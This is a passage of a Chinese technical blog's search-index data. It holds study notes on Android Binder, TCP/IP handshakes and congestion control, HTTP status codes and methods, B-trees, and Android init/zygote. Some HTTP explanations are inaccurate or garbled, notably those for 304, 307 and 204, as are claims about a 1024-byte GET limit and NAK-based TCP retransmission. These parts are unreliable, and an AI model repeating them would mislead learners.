安全性考虑传统IPC接收方无法确认发送方的身份（不知道发送方的UID/PID，只能由用户在数据包中填入UID/PID，不安全）。可靠的身份标记只有由IPC机制本身在内核中添加。其次传统IPC访问接入点是开放的，无法建立私有通道。从安全角度，Binder的安全性更高。 语言层面的角度Linux是基于C语言(面向过程的语言)，而Android是基于Java语言(面向对象的语句)，而对于Binder恰恰也符合面向对象的思想，将进程间通信转化为通过对某个Binder对象的引用调用该对象的方法，而其独特之处在于Binder对象是一个可以跨进程引用的对象，它的实体位于一个进程中，而它的引用却遍布于系统的各个进程之中。可以从一个进程传给其它进程，让大家都能访问同一Server，就像将一个对象或引用赋值给另一个引用一样。Binder模糊了进程边界，淡化了进程间通信过程，整个系统仿佛运行于同一个面向对象的程序之中。从语言层面，Binder更适合基于面向对象语言的Android系统。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"}]},{"title":"TCP/IP常见问题总结（二）","slug":"TCP-IP常见问题总结（二）","date":"2016-04-07T01:48:14.000Z","updated":"2020-05-11T07:23:44.738Z","comments":true,"path":"2016/04/07/TCP-IP常见问题总结（二）/","link":"","permalink":"https://superxlcr.github.io/2016/04/07/TCP-IP常见问题总结（二）/","excerpt":"","text":"上一篇文章的传送门：TCP/IP常见问题总结（一） TCP滑动窗口与回退N帧协议TCP作为一个提供可靠服务的传输层协议，对于数据的发送必须拥有一套良好的反馈机制，让发送方得知接收方接收到了数据，而TCP下的反馈机制大部分借鉴与数据链路层的反馈机制，因此在此我们分析一下数据链路层的反馈机制。 停等协议停等协议是一种非常简单的协议，发送方在发送完一帧数据后就一直等待接收方的确认信号（ACK），要是超时就重传数据，只到收到ACK信号后才发送下一帧数据。停等协议效率较低（如此低效数据链路层都不适用，TCP协议当然也不用了），其示意图如下： 滑动窗口协议之GoBackN由于发完一帧数据后发送方就挂起等待的行为非常低效，因此滑动窗口协议诞生了。滑动窗口的意思其实就是一个缓冲区（发送方为发送窗口，接收方为接收窗口），缓冲区的内容会随着数据的发送而移动，因此称为滑动窗口。我们先来讲讲滑动窗口协议中的GoBackN协议。滑动窗口协议允许发送方连发数帧，每发一帧都对应 一个计时器timeout，而GoBackN协议要求发送方把丢失帧及其之后的帧全部重传（因为光凭一个ACK并不能确定哪些帧出现了丢失，ACK的含义是：期待接收序号为N的帧，之前所有的帧都已经成功收到并依此交给了上层）。其示意图如下： 上面的示意图由于Data2丢失，导致了Data2～Data5的重发（窗口大小为4） 滑动窗口协议之选择性重发由于GoBackN中重发已经发送过的数据有点多余，因此选择性重发协议诞生了。选择性重发协议在ACK上引入了NAK的概念（否定性确认帧），表示小于N的帧已经全部收到并交给了上层，而第N帧丢失了，要求重发第N帧。当发送方接到NAK后，只要重发NAK表示的那一帧即可。其示意图如下： 上图中发送方发送的Data2丢失了，因此收到了接收方的NAK2，然后发送方只需重新发送Data2即可。在TCP协议中使用的也是选择性重发协议。 Http的报文结构Http协议（Hypertext Transfer Protocol）即超文本传输协议，它是一个应用层的基于TCP的无状态的协议，一般的通信过程为：建立连接、发送请求、响应请求、释放连接。其报文结构分为请求头与响应头两种： 请求头 请求头的第一行为请求行，其包括了三部分重要内容： 请求方法：主要为Get、Post等方法 URL：即请求的地址 协议版本：主要有Http1.0和Http1.1两种 请求头接下来是请求头部（也叫头域），头域的长度是不固定的，每一个头域属性的格式为：字段名：值（如：Range：请求范围）头域下面是一行空行，表示头域的结束。空行下来就是请求要提交的数据。 响应头 与请求头类似，响应头的第一行为响应行，主要包含如下三部分内容： 版本：使用的Http协议版本 状态码：表示处理结果状态的数值，由三位数字组成，第一位数字表示响应的类型，主要有以下几种： 1XX：表示服务器已接收了客户端请求，客户端可继续发送请求 2XX：表示服务器已成功接收到请求并进行处理 3XX：表示服务器要求客户端重定向 4XX：表示客户端的请求有非法内容 5XX：表示服务器未能正常处理客户端的请求而出现意外错误 原因短语：一串用于解释返回该状态码原因的字符串 响应行下来是响应头域，与请求头类似。响应头域下来是一行空行表示响应头域的结束。最后是响应头的响应实体内容。 Http的状态码含义状态码位于响应头的响应行中，表示服务器处理结果的情况，由三位数字组成，第一位数字表示响应的类型，主要有以下几种： 1XX：表示服务器已接收了客户端请求，客户端可继续发送请求100 (Continue/继续)如果服务器收到头信息中带有100-continue的请求，这是指客户端询问是否可以在后续的请求中发送附件。在这种情况下，服务器用100允许客户端继续或用417 (Expectation Failed)告诉客户端不同意接受附件。这个状态码是 HTTP 1.1中新加入的。 101 (Switching Protocols/转换协议)101 状态码是指服务器将按照其上的头信息变为一个不同的协议。这是 HTTP 1.1中新加入的。 2XX：表示服务器已成功接收到请求并进行处理200 (OK/正常)200 的意思是一切正常。一般用于相应GET和POST请求。 201 (Created/已创建)201表示服务器在请求的响应中建立了新文档；应在定位头信息中给出它的URL。 202 (Accepted/接受)202告诉客户端请求正在被执行，但还没有处理完。 203 (Non-Authoritative Information/非官方信息)状态码203是表示文档被正常的返回，但是由于正在使用的是文档副本所以某些响应头信息可能不正确。这是 HTTP 1.1中新加入的。 204 (No Content/无内容)在并没有新文档的情况下，204确保浏览器继续显示先前的文档。这各状态码对于用户周期性的重载某一页非常有用，并且你可以确定先前的页面是否已经更新。但是，这种方法对通过刷新响应头信息或等价的HTML标记自动重载的页面起作用，因为它会返回一个204状态码停止以后的重载。但基于JavaScript脚本的自动重载在这种情况下仍然需要能够起作用。 205 (Reset Content/重置内容)重置内容205的意思是虽然没有新文档但浏览器要重置文档显示。这个状态码用于强迫浏览器清除表单域。这是 HTTP 1.1中新加入的。 206 (Partial Content/局部内容)206是在服务器完成了一个包含Range头信息的局部请求时被发送的。这是 HTTP 1.1中新加入的。 3XX：表示服务器要求客户端重定向300 (Multiple Choices/多重选择)300表示被请求的文档可以在多个地方找到，并将在返回的文档中列出来。如果服务器有首选设置，首选项将会被列于定位响应头信息中。 301 (Moved Permanently)301状态是指所请求的文档在别的地方；文档新的URL会在定位响应头信息中给出。浏览器会自动连接到新的URL。 302 (Found/找到)与301有些类似，只是定位头信息中所给的URL应被理解为临时交换地址而不是永久的。注意：在 HTTP 1.0中，消息是临时移动(Moved Temporarily)的而不是被找到。 303 (See Other/参见其他信息)这个状态码和 301、302 相似，只是如果最初的请求是 POST，那么新文档（在定位头信息中给出）药用 GET 找回。这个状态码是新加入 HTTP 1.1中的。 304 (Not Modified/为修正)当客户端有一个缓存的文档，通过提供一个 If-Modified-Since 头信息可指出客户端只希望文档在指定日期之后有所修改时才会重载此文档，用这种方式可以进行有条件的请求。304是指缓冲的版本已经被更新并且客户端应刷新文档。另外，服务器将返回请求的文档及状态码 200。 305 (Use Proxy/使用代理)305表示所请求的文档要通过定位头信息中的代理服务器获得。这个状态码是新加入 HTTP 1.1中的。 307 (Temporary Redirect/临时重定向)浏览器处理307状态的规则与302相同。307状态被加入到 HTTP 1.1中是由于许多浏览器在收到302响应时即使是原始消息为POST的情况下仍然执行了错误的转向。只有在收到303响应时才假定浏览器会在POST请求时重定向。添加这个新的状态码的目的很明确：在响应为303时按照GET和POST请求转向；而在307响应时则按照GET请求转向而不是POST请求。该状态码是新加入HTTP 1.1中的。 4XX：表示客户端的请求有非法内容400 (Bad Request/错误请求)400指出客户端请求中的语法错误。 401 (Unauthorized/未授权)401表示客户端在授权头信息中没有有效的身份信息时访问受到密码保护的页面。这个响应必须包含一个WWW-Authenticate的授权信息头。 403 (Forbidden/禁止)403的意思是除非拥有授权否则服务器拒绝提供所请求的资源。这个状态经常会由于服务器上的损坏文件或目录许可而引起。 404 (Not Found/未找到)404状态每个网络程序员可能都遇到过，他告诉客户端所给的地址无法找到任何资源。它是表示“没有所访问页面”的标准方式。 405 (Method Not Allowed/方法未允许)405指出请求方法(GET, POST, HEAD, PUT, DELETE, 等)对某些特定的资源不允许使用。该状态码是新加入 HTTP 1.1中的。 406 (Not Acceptable/无法访问)406表示请求资源的MIME类型与客户端中Accept头信息中指定的类型不一致。406是新加入 HTTP 1.1中的。 407 (Proxy Authentication Required/代理服务器认证要求)407与401状态有些相似，只是这个状态用于代理服务器。该状态指出客户端必须通过代理服务器的认证。代理服务器返回一个Proxy-Authenticate响应头信息给客户端，这会引起客户端使用带有Proxy-Authorization请求的头信息重新连接。该状态码是新加入 HTTP 1.1中的。 408 (Request Timeout/请求超时)408是指服务端等待客户端发送请求的时间过长。该状态码是新加入 HTTP 1.1中的。 409 (Conflict/冲突)该状态通常与PUT请求一同使用，409状态常被用于试图上传版本不正确的文件时。该状态码是新加入 HTTP 1.1中的。 410 (Gone/已经不存在)410告诉客户端所请求的文档已经不存在并且没有更新的地址。410状态不同于404，410是在指导文档已被移走的情况下使用，而404则用于未知原因的无法访问。该状态码是新加入 HTTP 1.1中的。 411 (Length Required/需要数据长度)411表示服务器不能处理请求（假设为带有附件的POST请求），除非客户端发送Content-Length头信息指出发送给服务器的数据的大小。该状态是新加入 HTTP 1.1的。 412 (Precondition Failed/先决条件错误)412状态指出请求头信息中的某些先决条件是错误的。该状态是新加入 HTTP 1.1的。 413 (Request Entity Too Large/请求实体过大)413告诉客户端现在所请求的文档比服务器现在想要处理的要大。如果服务器认为能够过一段时间处理，则会包含一个Retry-After的响应头信息。该状态是新加入 HTTP 1.1的。 414 (Request URI Too Long/请求URI过长)414状态用于在URI过长的情况时。这里所指的“URI”是指URL中主机、域名及端口号之后的内容。该状态是新加入 HTTP 1.1的。 415 (Unsupported Media Type/不支持的媒体格式)415意味着请求所带的附件的格式类型服务器不知道如何处理。该状态是新加入 HTTP 1.1的。 416 (Requested Range Not Satisfiable/请求范围无法满足)416表示客户端包含了一个服务器无法满足的Range头信息的请求。该状态是新加入 HTTP 1.1的。 417 (Expectation Failed/期望失败)如果服务器得到一个带有100-continue值的Expect请求头信息，这是指客户端正在询问是否可以在后面的请求中发送附件。在这种情况下，服务器也会用该状态(417)告诉浏览器服务器不接收该附件或用100状态告诉客户端可以继续发送附件。该状态是新加入 HTTP 1.1的。 5XX：表示服务器未能正常处理客户端的请求而出现意外错误500 (Internal Server Error/内部服务器错误)500是常用的“服务器错误”状态。 501 (Not Implemented/未实现)501状态告诉客户端服务器不支持请求中要求的功能。例如，客户端执行了如PUT这样的服务器并不支持的命令。 502 (Bad Gateway/错误的网关)502被用于充当代理或网关的服务器；该状态指出接收服务器接收到远端服务器的错误响应。 503 (Service Unavailable/服务无法获得)状态码503表示服务器由于在维护或已经超载而无法响应。 504 (Gateway Timeout/网关超时)该状态也用于充当代理或网关的服务器；它指出接收服务器没有从远端服务器得到及时的响应。该状态是新加入 HTTP 1.1的。 505 (HTTP Version Not Supported/不支持的 HTTP 版本)505状态码是说服务器并不支持在请求中所标明 HTTP 版本。该状态是新加入 HTTP 1.1的。 Http request的几种方法在Http中主要包含以下请求方法： GET： 请求指定的页面信息，并返回实体主体 HEAD： 只请求页面的首部。 POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体 PUT： 从客户端向服务器传送的数据取代指定的文档的内容 DELETE： 请求服务器删除指定的页面 OPTIONS： 允许客户端查看服务器的性能 TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容 PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别 MOVE： 请求服务器将指定的页面移至另一个网络地址 COPY： 请求服务器将指定的页面拷贝至另一个网络地址 LINK： 请求服务器建立链接关系 UNLINK： 断开链接关系 WRAPPED： 允许客户端发送经过封装的请求 CONNECT：用于动态切换到隧道的代理 其中Http1.0仅支持GET、HEAD和POST，其余方法均为Http1.1添加。值的注意的是：GET方法与POST方法类似，但GET方法参数写在URL上，POST参数写在请求实体内容中，且GET方法参数不大于1024Byte，POST则没有限制。 Http1.1和Http1.0的区别Http1.0与Http1.1主要有以下区别： 是否允许复用连接：Http1.0不允许，响应请求后就断开连接，Http1.1允许且默认开启连接复用 Host头域：Http1.0没有，Http1.1有 状态码：Http1.1比Http1.0多了100,101,203,205等状态码 请求方式：Http1.0只有GET、HEAD和POST方法，Http1.1新增了其他多种方法","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"},{"name":"TCP","slug":"TCP","permalink":"https://superxlcr.github.io/tags/TCP/"}]},{"title":"算法导轮之B树的学习","slug":"算法导轮之B树的学习","date":"2016-04-06T04:44:50.000Z","updated":"2020-05-11T07:23:44.885Z","comments":true,"path":"2016/04/06/算法导轮之B树的学习/","link":"","permalink":"https://superxlcr.github.io/2016/04/06/算法导轮之B树的学习/","excerpt":"","text":"最近学习了算法导轮里B树相关的知识，在此写一篇博客作为总结。 引言B树是为磁盘或其他直接存取的辅助存储设备而设计的一种平衡搜索树。B树类似于红黑树，但它与红黑树最大不同之处在于B树的节点可以拥有很多孩子，因此B树的高度会比红黑树小很多，也因此B树在磁盘I/O方面表现要比红黑树好。（对于磁盘操作最耗时的部分在于磁盘读写，而每次读取一个新的树的节点就必须进行一次磁盘读取，因此节点较大、树高度较小的B树会进行较少的磁盘I/O操作） B树的定义一颗B树的定义如下：每个节点x均有如下属性： n表示存储在该节点的关键字个数 n个关键字本身key1、key2……keyn以非降序存放，即key1 &lt;= key2 &lt;= …… &lt;= keyn 一个leaf布尔值表示该节点是否为叶节点 每个内部节点包含了n+1个孩子，叶节点没有孩子 关键字keyi对存储在各子树中的关键字范围加以分割：即比keyi小的元素在其左子树，比keyi大的元素在其右子树 每个叶节点具有相同的深度 每个节点包含的关键字个数有上界与下界。我们定义B树的最小度数为t，则除根节点外的每个节点至少有t-1个关键字，每个节点最多有2t-1个关键字（即每个节点最少有t个孩子，最多有2t个孩子）（当一个节点有2t-1个关键字时，我们称它为满的）。 B树的示意图如下： 上图是一个最小度数为2的B树，因此每个节点拥有1个、2个或3个元素，拥有2个、3个或4个孩子，也被称为2-3-4树。根节点只有一个元素，因此它拥有两个孩子；两个孩子分别拥有3个和2个元素，因此他们分别拥有4个和3个孩子。看到DEF叶节点位于关键字C与G的中间，表明了关键字对于存储在各子树中的关键字范围进行了分割，其余同理。 B树的插入要讲到树，就不得不提树中关键的插入与删除操作，这里我们先总结B树的插入操作。当我们往B树中插入一个新的关键字时，由于B树节点的关键字是受到限制的，因此当一个节点关键字数目为2t-1时（该节点是满的），我们就必须进行分裂操作。 分裂节点分裂节点的主要操作为把满节点的中间关键字提升至父节点，把原满节点分裂为中间关键字的两个左右节点其示意图如下： 对于某个非满的节点x，若其孩子节点x.ci为满的（即孩子节点的关键字数目为2t-1)。则把其孩子节点的中间关键字（S）提升为父节点（x节点）的关键字，并把原孩子节点（x.c节点）分成两个t-1个关键字的节点，分别位于中间关键字（S）的左、右。还有一种比较特殊的情况就是B树根的分裂： 分裂是B树长高的唯一途径，因此分裂是非常重要的。 插入讲完分裂操作再讲插入操作就非常简单了。插入的时候我们通过比较不断地根据关键字的值寻找孩子节点，当发现一个满的节点时便分裂，最后找到对应的叶节点时根据关键字的值插入相应位置即可。下面是一个插入关键字的例子： B树的初始状态如图所示，这是一颗最小度数为3的B树，即他的关键字个数为2～5个。 插入关键字B，在根节点由于（B &lt; G）往进入G的左节点，到达叶节点后添加至A与C关键字之间。 插入关键字Q：在根节点，由于P &lt; Q 而且 Q &lt; X，进入P与X之间的子节点发现该子节点是满的，则进行分裂，把关键字T上升到父节点，原子节点分为RS与UV，分为在T关键字的左右由于Q &lt; T，于是进入T的左子节点在RS叶节点中找到对应位置并加入 插入关键字L：发现根节点是满的，分裂根节点，上移PL &lt; P 进入P的左子节点G &lt; L &lt; M，进入G与M关键字间的节点在叶节点的相应位置中插入 插入关键字F：F &lt; P，进入P的左子节点F &lt; G，进入G的左子节点发现满的节点，分裂，上移CF &gt; C，进入C的右子节点在叶节点的相应位置中插入 B树的删除讲完了B树的插入操作，我们再来讲讲B树的删除操作。对于删除操作，我们必须保证每个节点在删除前必须至少有t（最小度数）个关键字。 首先我们把要删除的关键字（假设为k）分两种情况： 关键字k在叶节点中：直接删除 关键字k在内部节点中，分三种情况： k的左子节点拥有t个关键字，则把k的左子节点的最后一个关键字（假设为j）上移到父节点，然后递归的删除j k的右子节点拥有t个关键字，则把k的右子节点的第一个关键字（假设为l）上移到父节点，然后递归的删除l k的左右子节点都只有t-1个关键字，则把k下降与左右子节点合并成一个拥有2t-1个关键字的节点，然后递归的删除k 然后我们再定义一些在寻找删除节点路上的操作：如果在寻找删除节点的路上，我们发现某个节点关键字数只有t-1个关键字，则分两种情况： 看该节点的相邻兄弟节点是否含有至少t个关键字，如果是则向相邻的兄弟节点“借一个关键字”（以该节点的左节点为例：把左节点的最后一个关键字上升至父节点，然后父节点位置的节点下移到关键字个数为t-1的节点上） 如果该节点相邻的兄弟节点都只含有t-1个关键字，则选择一个兄弟节点合并，并把两兄弟之间的父节点下移 下面我们来看一个B树删除的例子： B树的初始状态如图，这是一颗最小度数为3的B树，即每个节点拥有2～5个关键字。 删除F操作：F &lt; P，进入P的左子节点C &lt; F &lt; G，进入C与G之间的子节点在叶节点中删除F 删除M操作：M &lt; P，进入P的左子节点在内部节点中发现M，查看M的左子节点JKL，拥有3个关键字，则把最后一个关键字L上升至M的位置，递归的删除L节点JKL是叶节点，直接删除L即可 删除G操作：G &lt; P，进入P的左子节点在内部节点中发现G，查看G的左右子节点均只有2个关键字（不足最小度数3个），下降G关键字并合并其左右子节点节点DEGJK为叶节点，直接删除G即可 删除D操作：D &lt; P，进入P的左子节点发现内部节点CL只有2个关键字（不足最小度数3个），其兄弟节点也只有2个关键字，下降父节点P，与兄弟节点一起合并成一个节点由于C &lt; D &lt; L，进入C与L间的子节点DEJK节点是叶节点，直接删除D即可 删除B操作：B &lt; C，进入E的左子节点发现节点AC只有两个关键字，其兄弟节点EJK有三个关键字，则E上移到父节点，C下移到子节点，变为节点ABC节点ABC为叶节点，直接删除B即可","categories":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/tags/算法/"}]},{"title":"TCP/IP常见问题总结（一）","slug":"TCP-IP常见问题总结（一）","date":"2016-04-05T01:47:11.000Z","updated":"2020-05-11T07:23:44.732Z","comments":true,"path":"2016/04/05/TCP-IP常见问题总结（一）/","link":"","permalink":"https://superxlcr.github.io/2016/04/05/TCP-IP常见问题总结（一）/","excerpt":"","text":"以下为一些常见的TCP/IP问题总结： OSI与TCP/IP各层的结构与功能互联网主要分为五层： 物理层：通过线路（可以是有形的线也可以是无线链路）传送原始的比特(bit)流，只完成一个节点到另一个节点的传送（单跳） 数据链路层：通过物理网络传送帧，只完成一个节点到另一个节点的传送（单跳）(hop-by-hop, node-to-node) 网络层：把包里面的目的地址拿出来，进行路由选择(routing)，决定要往哪个方向传输，负责从源(source)通过路由选择到目的地(destination)的过程，达到从源主机传输数据到目标主机的目的(host-to-host) 传输层：也称为端到端传输，网络层只把数据送到主机，但不会送到进程。传输层负责负责进程与主机(host)间的传输，主机到主机(host-to-host)的传输交由网络层负责。在七层模型中，传输层还可以细分为会话层和展示层： 会话层：通过数据流建立会话关系 展示层：数据压缩、解压，加密、解密，数据类型、格式变换等一切与数据展示有关的操作 应用层：专门针对某些应用提供服务 网络层有如下协议： 传输层主要有TCP（传输控制协议）与UDP（用户数据报协议）两种协议。 应用层有如下协议： TCP与UDP的区别TCP即传输控制协议，UDP即用户数据报协议，他们的区别主要有以下几点： TCP协议是面向连接的，发送数据之前需要建立连接；UDP协议是无连接的，发送数据之前不需要建立连接 TCP协议提供可靠的传输服务；UDP协议提供不可靠的传输服务 TCP发送数据大小会受发送窗口、接收窗口及MSS（最大报文段）限制，因此会分为多段发送；UDP发送数据大小即为数据本身大小 TCP拥有众多反馈机制与附加机制；UDP没有反馈机制 TCP传输速度较慢；UDP传输速度较快 总的来说，TCP协议提供面向连接的，可靠的传输服务，但速度较慢，适合文件下载等传输任务；UDP协议提供无连接的，不可靠的传输服务，但速度较快，适合媒体流等看重传输速度的传输任务。 TCP报文结构TCP段结构如下： 其中： Source port：源端口，16位，说明发送端的端口号 Destination port：目的端口，16位，说明接收端的端口号 Sequence number：序列号，32位，说明这个数据的序号，从而接收端接收后可以进行排序，避免接收错序 Acknowledgement number：确认号，ACK，32位，表示说明这是对哪个数据的确认，表明期待接收编号为x的数据段，小于x的数据段已经成功接收并交给了上层 TCP header length：TCP头部长度，4位，由于TCP头部中带有option，而option的长度不固定，因此需要标识头部的长度 0（灰色那段）：padding，6位，无实际作用 标志位：6位，作用分别如下： URG：说明数据部分是否有紧急数据，可能导致乱序问题，因此并不会在实际中被使用 ACK：说明确认号是否有效 PSH：告诉接收方将缓冲区的数据尽快交给上层，可能会导致数据丢失，因此不会在实际中被使用 RST：重置连接，将连接强制中断 SYN：同步标识，建立连接时使用 FIN：结束标识，关闭连接时使用 Window size：窗口大小，16位，发送端告诉接收端自己的发送窗口的缓冲区大小 Checksum：校验和，16位 Urgent pointer：紧急数据指针，16位，说明数据段中哪一段数据是紧急数据 Options：0或32位，选项部分 Data：数据部分 TCP的三次握手与四次挥手过程TCP三次握手其示意图如下： 三次握手是指TCP建立连接的过程，顾名思义，主要分为3个步骤： 客户机发起请求 SYN为1：说明发起新的连接 SEQ为x：说明这个段的序列号是多少，服务器收到后会调整接收的滑动窗口为x+1(表明下一次要接收的段的序列号为x+1)，一般随机选取x 指定窗口大小的值：客户机说明自己的接收窗口目前还可容纳多少数据 服务器响应请求 ACK为1：表示确认接收请求 ACK号为x+1：表示接受了序列号位x及以下的数据，期待序列号为x+1的数据 SYN为1：说明服务器同意新的连接建立(只是同意，还没有没有分配端口资源) SEQ为y：说明这个段的序列号是多少，客户机收到后会调整接收的滑动窗口为y+1(表明下一次要接收的段的序列号为y+1)，与x没有关系 指定窗口大小的值：服务器说明自己的接收窗口目前还可容纳多少数据 服务器响应请求 ACK为1：表示确认接收请求 ACK号为y+1：表示接受了序列号位y及以下的数据，期待序列号为y+1的数据 SEQ为x+1：说明这个段的序列号是多少，服务器收到后会调整接收的滑动窗口为x+2(表明下一次要接收的段的序列号为x+2) 看完三次握手我们不禁有疑问，为什么需要三次握手呢？一次握手，两次握手为什么不行呢？原因如下： 一次握手：客户机根本不知道连接的有效性 有可能这次握手请求根本没有到达服务器或者直接被服务器拒绝 两次握手：服务器无法确认该请求的合法性，如果是两次握手服务器将立即分配端口资源造成资源浪费，可能使得其它客户机无法连接 发送方请求连接的包在信道里面停留了很长时间，使得连接都释放掉了这个包才到 会遭遇SYN泛洪攻击：一台恶意的主机伪造自己的IP向服务器请求连接 TCP四次挥手其示意图如下： TCP四次挥手是指TCP释放连接的过程，顾名思义，主要分为4个步骤： 释放连接的发起方发起释放连接请求 FIN为1：结束位为1，说明发起方的发送过程已经结束，不会再向对方发送实际数据 SEQ为x：序列号为x 释放连接的接收方回复释放连接请求 ACK为1：表示确认接收请求 ACK号为x+1：表示接受了序列号位x及以下的数据，期待序列号为x+1的数据 释放连接的接收方同意释放连接请求 FIN为1：结束位为1，说明发起方的发送过程已经结束，不会再向对方发送实际数据 SEQ为y：序列号为y 释放连接的发起方回复释放连接请求 ACK为1：表示确认接收请求 ACK号为y+1：表示接受了序列号位x及以下的数据，期待序列号为y+1的数据 发起方在第四次握手发出ACK后会等待一段时间后再正式释放连接，这段时间被称为TIME_WAIT。会有TIME_WAIT的原因主要是保证接收方能够收到对于FIN的ACK，如果ACK在返回的过程中丢失会导致接收方超时，这时会再发一个FIN给到发起方，因此这一段时间正好是ACK返回时间加上重发的FIN到达发起方的时间。另一个原因是如果没有TIME_WAIT就马上建立了新的连接，那么网络中遗留下来的旧的数据包将可能会干扰接收方的接收，接收方无法识别出是新的数据包还是旧的数据包，因此在TIME_WAIT接收到的其它数据包会被丢弃。 其实TCP释放连接的方法除了四次握手外还有直接重置RST的强制释放方法，在此不再赘述。 TCP拥塞控制由于发送方到接收方之间的信道是公用的，因此如果发送方不考虑中间信道的容量随意发送就可能出现拥塞，拥塞会导致延迟严重，甚至大量丢包，因此我们需要进行拥塞控制。拥塞控制的关键在于控制发送端的发送速率，发送端的发送速率受到发送窗口大小的限制，因此在TCP的拥塞控制中实际控制的是发送端的发送窗口大小。当出现以下两种情况之一时，我们断定传输出现了拥塞： 连续(三个)的序号为x的ACK：说明序号为x的TCP数据段很可能丢失 超时时间到来前未收到ACK 当出现拥塞时，我们主要有以下方法进行拥塞控制： 为了防止拥塞窗口大小增加过快而导致网络拥塞，我们会设置一个慢开始门限状态变量： 当拥塞窗口大小 &lt; 慢开始门限，使用慢启动算法 当拥塞窗口大小 &gt; 慢开始门限，使用拥塞控制算法 当拥塞窗口大小 == 慢开始门限，使用两个算法都可以 AIMDAIMD（additive increase multiplicative decrease）是一个拥塞控制算法，其意思即加性增加乘性减少，其初始拥塞窗口大小为任意值。当我们每成功传输一个TCP数据段，拥塞窗口大小加1MSS（最大报文大小），此为加性增加；而当我们发现传输出现拥塞时，拥塞窗口大小减半，此为乘性减少。这种算法的问题在于增加的速度慢，丢包代价大。 慢启动慢启动的初始时拥塞窗口大小为1MSS（因此叫慢启动算法），最大为65535MSS（窗口大小只有16bit，因此最大也只能这么大）。慢启动算法开始时每成功传输一个TCP数据段，拥塞窗开大小也是增加1MSS，但当其发现拥塞时，会首先确定一个阙值：阙值为当前窗口大小的一半，然后根据不同的机制进行处理： Tahoe机制：出现拥塞时窗口大小会变回1MSS，但当窗口大小小于阙值时，传输成功窗口大小加倍（指数增长），大于阙值后改为加性增长。 Reno机制：出现拥塞窗口大小直接变为阙值。（也称为快速恢复机制）","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"TCP","slug":"TCP","permalink":"https://superxlcr.github.io/tags/TCP/"}]},{"title":"深入理解Android之init与zygote","slug":"深入理解Android之init与zygote","date":"2016-04-04T11:31:19.000Z","updated":"2020-05-11T07:23:44.862Z","comments":true,"path":"2016/04/04/深入理解Android之init与zygote/","link":"","permalink":"https://superxlcr.github.io/2016/04/04/深入理解Android之init与zygote/","excerpt":"","text":"最近看了《深入理解Android卷I》中关于init进程与zygote进程的知识，特此写一篇博客记录一下收获。 init进程init进程是Android系统中的用户空间的第一个进程，它的进程号是1，作为天字第一号进程，init进程需要完成很多工作，其示意图如下： init进程的工作主要分为四步： 解析配置文件：解析init,rc与init,硬件名.rc（每种类型的手机有自己的硬件名），根据解析的内容执行第二步操作 执行各阶段操作：各种初始化操作，主要分为early-init、init、early-boot和boot四个阶段（其中zygote进程是在boot阶段通过fork与execv启动的） 启动属性服务：属性服务类似于Windows的注册表，可以保存一些设备上的键值对信息。主要分为在共享内存上初始化和循环处理请求两部分 死循环：完成以上操作后，init进程进入一个死循环检测系统中死去的进程，并负责把他们重启和进行收尾工作 zygote进程讲完init进程我们再来提一下著名的zygote进程。zygote即受精卵，他与system_server进程分别是Android中Java世界的半边天。但zygote进程刚开始并不叫zygote进程，而是app_process进程，他的工作流程示意图如下： zygote进程的工作主要分为7个步骤： 改名：进程的名字从app_process改为zygote 创建VM：创建虚拟机，并设置虚拟机的堆大小（默认16M）等参数 注册JNI函数：由于zygoteInit类是由Java代码编写而成的，需要调用一些native方法，因此在此注册一些JNI函数 建立IPC的Socket服务器端（从此处开始是Java世界了） 预加载类与资源：此处需要加载1200多个类与大量系统自带的资源（com.android.R.XXX等），因此比较耗时 启动system_server进程：通过fork方法启动系统服务进程 runSelectLoopMode：完成上述工作后zygote初始化的工作已基本完成，只需要监听Socket的消息处理IPC请求即可 zygote作为Android系统中创建Java世界的盘古，创建了第一个Java虚拟机，预加载了大量的Java类与Android核心资源，启动了Android系统服务进程。他进行一系列的初始化操作就是通过牺牲开机时间，来减少Android应用启动的时间。当我们启动一个Android应用时，通过IPC通信向zygote进程发送请求，然后zygote进程通过fork方法复制自身来为应用创建一个进程，由于zygote进程已经预加载了大量的类与资源，因此我们启动应用的时间将会显著提升。 system_server进程system_server进程是zygote进程通过fork方法创造出来的第一个子进程，而且当system_server进程启动失败时会导致zygote进程自杀重启，因此其重要性不言而喻。那么system_server进程进行了那些工作能呢？我们还是以示意图的方式来看一看： system_server进程主要进行了以下工作： 初始化Native层，与Binder通信系统建立联系（目前还没看到Binder通信系统，以后补充） 调用SystemServer类的main方法（Java层） 加载其动态链接库，注册JNI函数 调用Init1方法（native方法）：创建了一些关键的系统服务，并把调用线程加入了Binder 调用Init2方法（Java方法）：创建了一个线程，启动了大量的系统服务，并在最后调用了Looper.loop方法","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"}]},{"title":"操作系统基础知识总结（二）","slug":"操作系统基础知识总结（二）","date":"2016-04-04T02:37:49.000Z","updated":"2020-05-11T07:23:44.851Z","comments":true,"path":"2016/04/04/操作系统基础知识总结（二）/","link":"","permalink":"https://superxlcr.github.io/2016/04/04/操作系统基础知识总结（二）/","excerpt":"","text":"上一篇文章的传送门：操作系统基础知识总结（一） IPC通信方式IPC即进程间通信（Inter-Process Communication），由于进程的用户空间是相互独立的，一般而言不能随便访问，因此我们需要一些IPC方式来进行进程间信息传递。常见的IPC方式有以下几种： 管道：管道主要分为普通管道（单工，父子进程）、流管道（半双工）和有名管道（半双工、任意进程）三种 